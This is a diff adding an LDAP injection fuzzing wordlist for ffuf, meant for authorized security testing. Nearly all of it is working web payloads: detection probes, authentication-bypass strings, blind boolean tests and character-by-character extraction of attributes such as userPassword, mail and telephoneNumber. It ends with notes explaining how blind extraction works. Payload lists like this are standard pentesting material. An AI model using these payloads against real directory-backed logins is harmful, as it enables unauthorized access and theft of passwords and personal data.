@@ -1,0 +1,90 @@
+# ============================================================
+# LDAP Injection Fuzzing Wordlist
+# Usage: ffuf -u http://example.com/login?user=FUZZ -w this_file.txt
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Detection / breaking probes
+# ---------------------------------------
+*
+*)(&
+*)(uid=*))(|(uid=*
+*)(|(objectclass=*
+*(|(objectclass=*
+*()|&'
+!
+&
+|
+(
+)
+\
+NUL
+*/*
+
+# ---------------------------------------
+# SECTION 2: Authentication bypass
+# ---------------------------------------
+*)(uid=*
+*)(uid=*))(|(uid=*
+admin*
+admin*)((|userPassword=*
+*)(cn=*
+admin)(&)
+*)(objectClass=*
+admin))(|(|
+*)(mail=*))%00
+admin*)((|(password=*
+*)(|(mail=*))
+*))(|(uid=*
+*))(|(cn=*
+")(cn=*
+")(&)
+
+# ---------------------------------------
+# SECTION 3: Blind boolean-based
+# ---------------------------------------
+*)(objectClass=user)(objectClass=*
+admin)(objectClass=*
+*)(&(objectClass=user)(uid=admin))
+a*
+*a
+*a*
+ad*
+adm*
+
+# ---------------------------------------
+# SECTION 4: Attribute enumeration (blind extraction, char-by-char)
+# ---------------------------------------
+admin)(userPassword=a*
+admin)(userPassword=b*
+admin)(userPassword=aa*
+*)(userPassword=*
+*)(description=*
+*)(mail=*
+*)(telephoneNumber=*
+*)(homeDirectory=*
+
+# ---------------------------------------
+# SECTION 5: Filter injection payloads (raw filter breakout)
+# ---------------------------------------
+(cn=*)
+(cn=*))(|(cn=*
+(|(cn=*)(cn=*))
+(&(cn=*)(cn=*))
+(!(cn=*))
+(uid=*)(|(uid=*
+(uid=admin)(&(1=1
+(&(uid=admin)(userPassword=*))
+(|(uid=admin)(uid=administrator))
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - LDAP injection behaves differently depending on whether the app
+#   uses AND-based (&) or OR-based (|) filter construction internally —
+#   test both bypass styles in Section 2.
+# - Blind extraction (Section 4) works by observing true/false response
+#   differences (login success/fail, different error) while incrementing
+#   the guessed prefix character by character.
+# - Only use against systems you are explicitly authorized to test.
